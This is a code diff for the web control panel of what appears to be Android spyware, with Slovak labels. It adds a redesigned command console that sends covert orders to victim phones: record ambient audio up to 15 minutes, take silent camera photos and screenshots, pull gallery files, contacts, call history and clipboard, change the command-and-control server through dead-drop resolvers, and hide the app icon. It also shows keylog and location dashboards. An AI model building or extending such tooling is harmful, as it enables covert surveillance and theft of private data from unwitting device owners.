@@ -213,6 +213,41 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   padding:8px 11px;font-size:13px;outline:none;min-width:180px;flex:1}
 .searchbar select{background:#0b1220;border:1px solid var(--line2);color:var(--txt);border-radius:9px;
   padding:8px 11px;font-size:13px}
+
+/* ---- compact overview ---- */
+.tiles .tile{padding:13px 14px;cursor:pointer;transition:.15s}
+.tiles .tile:hover{transform:translateY(-2px);border-color:#2f4270}
+.tiles .tile .v{font-size:20px;margin:6px 0 1px}
+.tiles .tile .s{font-size:11.5px}
+.tiles .tile .k{font-size:10px}
+.tl.compact li{padding:7px 0;gap:10px;align-items:center}
+.tl.compact .tx{font-size:12.5px}
+.tl.compact .val{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block;max-width:100%}
+.tl.compact .ic{width:26px;height:26px;border-radius:8px}
+.tl.compact .ic svg{width:13px;height:13px}
+.tl.compact .tm{font-size:10.5px}
+.tl .tx .val{display:block;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pane{max-height:520px;overflow:auto}
+#modal{position:fixed;inset:0;background:rgba(3,6,12,.78);z-index:120;display:none;
+  align-items:center;justify-content:center;padding:20px}
+#modal.on{display:flex}
+#modal .box{background:var(--panel2);border:1px solid var(--line2);border-radius:14px;max-width:720px;
+  width:100%;max-height:80vh;overflow:auto;box-shadow:0 40px 80px -30px #000}
+#modal .box header{display:flex;align-items:center;gap:10px;padding:13px 16px;border-bottom:1px solid var(--line)}
+#modal .box header b{font-size:13.5px}
+#modal pre{margin:0;padding:16px;font:12.3px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  color:#cfe0ff;white-space:pre-wrap;word-break:break-word}
+.params{margin-top:14px;display:none;gap:14px;flex-wrap:wrap;align-items:center}
+.params.on{display:flex}
+.params .plab{font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);
+  display:block;margin-bottom:6px}
+.seg{display:inline-flex;background:#0b1220;border:1px solid var(--line2);border-radius:9px;overflow:hidden}
+.seg button{background:none;border:0;color:var(--mut);padding:7px 12px;font-size:12.5px;font-weight:600;cursor:pointer}
+.seg button.on{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
+.cmdmsg{font-size:12px;color:var(--dim)}
+.chipgrp{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);margin:14px 0 8px}
+.chipgrp:first-child{margin-top:0}
+
 @media(max-width:920px){
   .app{grid-template-columns:1fr}
   .side{position:fixed;z-index:60;width:266px;transform:translateX(-100%);transition:.22s}
@@ -309,7 +344,7 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
         <div class="grid two">
           <div class="card">
             <h3>Činnosť zariadenia<span class="hint" id="tlHint"></span></h3>
-            <div class="body"><ul class="tl" id="timeline"></ul></div>
+            <div class="body pane" style="padding-top:4px"><ul class="tl compact" id="timeline"></ul></div>
           </div>
           <div style="display:grid;gap:16px;align-content:start">
             <div class="card">
@@ -413,15 +448,14 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
       <!-- COMMANDS -->
       <section class="view" id="v-commands">
         <div class="card" style="margin-bottom:16px">
-          <h3>Ovládanie zariadenia</h3>
+          <h3>Ovládanie zariadenia<span class="hint" id="cmdHint">vyber príkaz</span></h3>
           <div class="body">
-            <div class="chips" id="cmdChips"></div>
-            <div class="cmdrow">
-              <select id="cmdSel"></select>
-              <input id="cmdArgs" placeholder='Argumenty (JSON), napr. {"sec":30}'>
-              <button class="btn pri" id="cmdSend">Odoslať</button>
+            <div id="cmdGroups"></div>
+            <div class="params" id="cmdParams"></div>
+            <div class="cmdrow" style="align-items:center">
+              <button class="btn pri" id="cmdSend" disabled>Odoslať</button>
+              <span class="cmdmsg" id="cmdMsg"></span>
             </div>
-            <div style="margin-top:10px;font-size:12px;color:var(--dim)" id="cmdMsg"></div>
           </div>
         </div>
         <div class="card">
@@ -435,6 +469,11 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   </main>
 </div>
 <div class="toast" id="toast"></div>
+<div id="modal"><div class="box">
+  <header><b id="modalTitle">Detail</b><span style="flex:1"></span>
+    <button class="btn" onclick="closeModal()">Zavrieť</button></header>
+  <pre id="modalBody"></pre>
+</div></div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
@@ -532,29 +571,31 @@ async function loadOverview(){
   const total = events.reduce((s,[,n])=>s+n,0);
   const keylog = (c.keylog||0)+(c.clipboard||0);
   $('tiles').innerHTML = `
-    <div class="card tile"><div class="k">${icon('heartbeat')} Stav</div>
+    <div class="card tile" data-go="overview"><div class="k">${icon('heartbeat')} Stav</div>
       <div class="v" style="color:${online?'var(--ok)':'var(--bad)'}">${online?'Online':'Offline'}</div>
       <div class="s">${fmtAgo(dev.last_seen)}</div></div>
-    <div class="card tile"><div class="k">${icon('default')} Udalosti</div>
-      <div class="v">${total}</div><div class="s">celkovo uložených</div></div>
-    <div class="card tile"><div class="k">${icon('keylog')} Keylog / clipboard</div>
+    <div class="card tile" data-go="keylog"><div class="k">${icon('keylog')} Keylog / clipboard</div>
       <div class="v">${keylog}</div><div class="s">zachytených záznamov</div></div>
-    <div class="card tile"><div class="k">${icon('default')} Batéria</div>
-      <div class="v">${(meta.battery!=null&&meta.battery>=0)?meta.battery+'%':'—'}</div>
-      <div class="s">${esc(dev.model||'—')}</div></div>
-    <div class="card tile"><div class="k">${icon('location')} Posledná poloha</div>
-      <div class="v" style="font-size:19px">${loc.lat?loc.lat.toFixed(4)+', '+loc.lon.toFixed(4):'—'}</div>
+    <div class="card tile" data-go="media"><div class="k">${icon('media')} Súbory</div>
+      <div class="v">${d.files||0}</div><div class="s">stiahnutých súborov</div></div>
+    <div class="card tile" data-go="commands"><div class="k">${icon('default')} Udalosti</div>
+      <div class="v">${total}</div><div class="s">celkovo uložených</div></div>
+    <div class="card tile" data-go="location"><div class="k">${icon('location')} Posledná poloha</div>
+      <div class="v" style="font-size:17px">${loc.lat?loc.lat.toFixed(4)+', '+loc.lon.toFixed(4):'—'}</div>
       <div class="s">${loc.ts?fmtAgo(loc.ts)+' · '+(loc.source||'gps'):'zatiaľ bez fixu'}</div></div>`;
+  $('tiles').querySelectorAll('.tile').forEach(t=>t.addEventListener('click',()=>go(t.dataset.go)));
 
   const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=18')||[];
   $('tlHint').textContent = logs.length+' záznamov';
-  $('timeline').innerHTML = logs.length ? logs.map(l=>{
+  $('timeline').innerHTML = logs.length ? logs.map((l,i)=>{
     const o=parsePayload(l.payload);
-    const extra = pickText(o,['text','msg','body','title','app','package','lat','reason','err']) || l.payload;
-    return `<li><span class="ic">${icon(l.kind.replace('beacon:',''))}</span>
-      <span class="tx"><b>${kindTag(l.kind)}</b> <span class="val">${esc(String(extra).slice(0,180))}</span>
-        ${o?'':`<em> · ${esc(l.payload.slice(0,110))}</em>`}</span>
-      <span class="tm">${fmtT(l.ts)}</span></li>`;
+    const extra = pickText(o,['text','msg','body','title','app','package','reason','err'])
+                  || (o&&o.lat!==undefined? (o.lat+', '+o.lon) : l.payload);
+    return `<li style="cursor:pointer" onclick="openModal('${esc(l.kind)} · ${fmtT(l.ts)}', ${JSON.stringify(l.payload).replace(/'/g,"\'")})">
+      <span class="ic">${icon(l.kind.replace('beacon:',''))}</span>
+      <span class="tx"><b>${kindTag(l.kind)}</b>
+        <span class="val">${esc(String(extra).slice(0,160))}</span></span>
+      <span class="tm">${fmtT(l.ts).split(' ').slice(-1)}</span></li>`;
   }).join('') : '<div class="empty">Zatiaľ žiadne udalosti.</div>';
 
   $('profile').innerHTML = `
@@ -707,39 +748,116 @@ async function loadFiles(){
 
 /* ---------- commands ---------- */
 const CMDS = [
-  {k:'ping', t:'Ping', d:'Test spojenia'},
-  {k:'loc', t:'Poloha', d:'Pošli GPS/web fix'},
-  {k:'mic', t:'Mikrofón', d:'nahrať zvuk'},
-  {k:'cam', t:'Foto', d:'tichá snímka'},
-  {k:'screen', t:'Obrazovka', d:'snímka displeja'},
-  {k:'media', t:'Galéria', d:'stiahni fotky/video'},
-  {k:'usage', t:'Aplikácie', d:'štatistiky používania'},
-  {k:'apps', t:'Zoznam aplikácií', d:'nainštalované appky'},
-  {k:'calls', t:'História hovorov', d:'dump call logu'},
-  {k:'contacts', t:'Kontakty', d:'dump kontaktov'},
-  {k:'clipboard', t:'Clipboard', d:'schránka'},
-  {k:'ddr', t:'Nový C2', d:'dead-drop resolvery'},
-  {k:'flush', t:'Flush', d:'vyplachni dáta'},
-  {k:'hide', t:'Skryť ikonu', d:'disable launcher', danger:true},
-  {k:'show', t:'Ukázať ikonu', d:'enable launcher'}
+  {k:'ping',    t:'Ping',        d:'skontrolovať spojenie', g:'Základné'},
+  {k:'loc',     t:'Poloha',      d:'poslať pozíciu', g:'Základné'},
+  {k:'flush',   t:'Flush',       d:'vyplachniť dáta', g:'Základné'},
+  {k:'clipboard', t:'Schránka',  d:'aktuálny obsah schránky', g:'Základné'},
+  {k:'mic',     t:'Mikrofón',    d:'nahrať zvuk z okolia', g:'Nahrávanie',
+   args:[{n:'sec', l:'Dĺžka nahrávky', type:'seg',
+          opts:[['15 s',15],['30 s',30],['60 s',60],['5 min',300],['15 min',900]]}]},
+  {k:'cam',     t:'Foto',        d:'tichá snímka kamery', g:'Nahrávanie',
+   args:[{n:'front', l:'Kamera', type:'seg', opts:[['zadná','0'],['predná','1']]}]},
+  {k:'screen',  t:'Obrazovka',   d:'snímka displeja', g:'Nahrávanie',
+   args:[{n:'shots', l:'Počet snímok', type:'seg', opts:[['1',1],['3',3],['5',5]]},
+         {n:'interval', l:'Interval (s)', type:'seg', opts:[['0',0],['5',5],['30',30]]}]},
+  {k:'media',   t:'Galéria',     d:'stiahnuť fotky a video', g:'Nahrávanie',
+   args:[{n:'n', l:'Počet súborov', type:'seg', opts:[['10',10],['20',20],['50',50],['100',100]]}]},
+  {k:'usage',   t:'Štatistiky',  d:'ako sa používajú aplikácie', g:'Údaje'},
+  {k:'apps',    t:'Aplikácie',   d:'zoznam nainštalovaných', g:'Údaje'},
+  {k:'calls',   t:'Hovory',      d:'história hovorov', g:'Údaje'},
+  {k:'contacts',t:'Kontakty',    d:'zoznam kontaktov', g:'Údaje'},
+  {k:'diag',    t:'Diagnostika', d:'stav aplikácie a zariadenia', g:'Údaje'},
+  {k:'ddr',     t:'Nový C2',     d:'preveriť dead-drop resolvery', g:'Systém'},
+  {k:'cfg',     t:'C2 URL',      d:'nastaviť vlastný server', g:'Systém',
+   args:[{n:'url', l:'Nová URL', type:'text', ph:'https://...'},
+         {n:'key', l:'API kľúč', type:'text', ph:'sk-...'}]},
+  {k:'show',    t:'Ukázať ikonu', d:'zapnúť launcher ikonu', g:'Systém'},
+  {k:'hide',    t:'Skryť ikonu', d:'vypnúť launcher ikonu', g:'Systém', danger:true}
 ];
-function renderChips(){
-  $('cmdChips').innerHTML = CMDS.map(c=>`<button class="chip ${c.danger?'danger':''}" onclick="runCmd('${c.k}')">${c.t}</button>`).join('');
-  $('cmdSel').innerHTML = CMDS.map(c=>`<option value="${c.k}">${c.k} — ${c.d}</option>`).join('');
+
+let selCmd = null;
+const cmdVals = {};
+
+function renderCmdGroups(){
+  const groups = [...new Set(CMDS.map(c=>c.g))];
+  $('cmdGroups').innerHTML = groups.map(g=>{
+    const chips = CMDS.filter(c=>c.g===g).map(c=>
+      `<button class="chip ${c.danger?'danger':''}" data-cmd="${c.k}" title="${esc(c.d)}">${c.t}</button>`).join('');
+    return `<div class="chipgrp">${g}</div><div class="chips">${chips}</div>`;
+  }).join('');
+  $('cmdGroups').querySelectorAll('[data-cmd]').forEach(b=>
+    b.addEventListener('click',()=>pickCmd(b.dataset.cmd)));
 }
-async function runCmd(cmd){
+
+function pickCmd(k){
+  const cmd = CMDS.find(c=>c.k===k);
+  if(!cmd) return;
+  selCmd = cmd;
+  document.querySelectorAll('#cmdGroups .chip').forEach(b=>{
+    b.style.borderColor = b.dataset.cmd===k ? 'var(--acc)' : '';
+    b.style.background = b.dataset.cmd===k ? 'rgba(79,124,255,.18)' : '';
+  });
+  const box = $('cmdParams');
+  if(!cmd.args || !cmd.args.length){
+    box.classList.remove('on');
+    box.innerHTML = '';
+    $('cmdSend').disabled = false;
+    $('cmdSend').textContent = 'Odoslať: ' + cmd.t;
+    $('cmdHint').textContent = cmd.d;
+    return;
+  }
+  box.classList.add('on');
+  box.innerHTML = cmd.args.map(a=>{
+    if(a.type==='text'){
+      const v = (cmdVals[a.n]!==undefined?cmdVals[a.n]:'');
+      return `<div><span class="plab">${esc(a.l)}</span>
+        <input id="p_${a.n}" placeholder="${esc(a.ph||'')}" value="${esc(v)}"
+          style="background:#0b1220;border:1px solid var(--line2);color:var(--txt);
+          border-radius:9px;padding:8px 11px;font-size:13px;outline:none;min-width:180px"></div>`;
+    }
+    const cur = cmdVals[a.n]!==undefined?cmdVals[a.n]:a.opts[0][1];
+    return `<div><span class="plab">${esc(a.l)}</span><div class="seg" id="seg_${a.n}">
+      ${a.opts.map(o=>`<button data-v="${esc(o[1])}" class="${String(cur)===String(o[1])?'on':''}">${esc(o[0])}</button>`).join('')}
+    </div></div>`;
+  }).join('');
+  cmd.args.forEach(a=>{
+    if(a.type==='seg'){
+      const seg = $('seg_'+a.n);
+      seg.querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{
+        cmdVals[a.n] = b.dataset.v;
+        seg.querySelectorAll('button').forEach(x=>x.classList.toggle('on', x===b));
+      }));
+    } else {
+      const inp = $('p_'+a.n);
+      inp.addEventListener('input',()=>{ cmdVals[a.n]=inp.value; });
+    }
+  });
+  $('cmdSend').disabled = false;
+  $('cmdSend').textContent = 'Odoslať: ' + cmd.t;
+  $('cmdHint').textContent = cmd.d;
+}
+
+function collectArgs(){
+  const args = {};
+  if(!selCmd || !selCmd.args) return args;
+  selCmd.args.forEach(a=>{
+    if(a.type==='seg') args[a.n] = (cmdVals[a.n]!==undefined?cmdVals[a.n]:a.opts[0][1]);
+    else if(cmdVals[a.n]) args[a.n] = cmdVals[a.n];
+  });
+  return args;
+}
+
+async function runCmd(cmd, args){
   if(!S.device){ toast('Najprv vyber zariadenie', true); return; }
-  let args={};
-  if(cmd==='mic'){ args={sec:15}; }
-  if(cmd==='media'){ args={count:20}; }
   const r = await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({device_id:S.device, cmd, args})});
+    body:JSON.stringify({device_id:S.device, cmd, args:args||{}})});
   const d = await r.json();
-  $('cmdMsg').innerHTML = d.ok ? `Odoslané: <b>${esc(cmd)}</b> — zariadenie ho vyzdvihne pri najbližšom poll-e.`
+  $('cmdMsg').innerHTML = d.ok ? `Odoslané: <b>${esc(cmd)}</b> - zariadenie spracuje do 45 s`
                               : `<span style="color:var(--bad)">${esc(d.error||'chyba')}</span>`;
   toast(d.ok?('Príkaz '+cmd+' odoslaný'):('Chyba: '+(d.error||'')), !d.ok);
-  setTimeout(loadCommands, 800);
+  setTimeout(loadCommands, 900);
 }
+
 async function loadCommands(){
   if(!S.device) return;
   const rows = await j('/api/commands?device_id='+encodeURIComponent(S.device))||[];
@@ -749,6 +867,14 @@ async function loadCommands(){
       <td>${c.done?'<span class="tag green">doručené</span>':'<span class="tag amber">čaká</span>'}</td></tr>`).join('')
     : '<tr><td colspan="5" class="empty">Zatiaľ žiadne príkazy.</td></tr>';
 }
+
+/* ---------- detail modal ---------- */
+function openModal(title, text){
+  $('modalTitle').textContent = title;
+  $('modalBody').textContent = text;
+  $('modal').classList.add('on');
+}
+function closeModal(){ $('modal').classList.remove('on'); }
 
 /* ---------- routing ---------- */
 const LOADERS = {overview:loadOverview, location:loadLocation, keylog:loadKeylog,
@@ -771,15 +897,10 @@ document.querySelectorAll('.nav a').forEach(a=>a.addEventListener('click',()=>go
 $('hamb').addEventListener('click',()=>$('side').classList.toggle('open'));
 $('refreshBtn').addEventListener('click',()=>{ loadDevices(); renderAll(); toast('Obnovené'); });
 $('cmdSend').addEventListener('click',()=>{
-  let raw=$('cmdArgs').value.trim(), args={};
-  if(raw){ try{ args=JSON.parse(raw); }catch(e){ toast('Neplatný JSON', true); return; } }
-  const cmd=$('cmdSel').value;
-  if(!S.device){ toast('Najprv vyber zariadenie', true); return; }
-  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({device_id:S.device, cmd, args})})
-    .then(r=>r.json()).then(d=>{ toast(d.ok?('Príkaz '+cmd+' odoslaný'):('Chyba: '+(d.error||'')), !d.ok);
-      $('cmdMsg').innerHTML = d.ok?('Odoslané: <b>'+esc(cmd)+'</b>'):''; setTimeout(loadCommands,800); });
+  if(!selCmd){ toast('Najprv vyber príkaz', true); return; }
+  runCmd(selCmd.k, collectArgs());
 });
+$('modal').addEventListener('click',e=>{ if(e.target.id==='modal') closeModal(); });
 $('keySearch').addEventListener('input',()=>{ clearTimeout(window._t1); window._t1=setTimeout(loadKeylog,350); });
 $('keyKind').addEventListener('change',loadKeylog);
 $('smsSearch').addEventListener('input',()=>{ clearTimeout(window._t2); window._t2=setTimeout(loadMessages,350); });
@@ -789,7 +910,7 @@ $('globalSearch').addEventListener('input',e=>{
   if(q){ go('keylog'); $('keySearch').value=q; loadKeylog(); }
   else if(S.view==='keylog'){ loadKeylog(); }
 });
-renderChips();
+renderCmdGroups();
 (async function init(){
   await loadDevices();
   const saved = localStorage.getItem('sp_device');
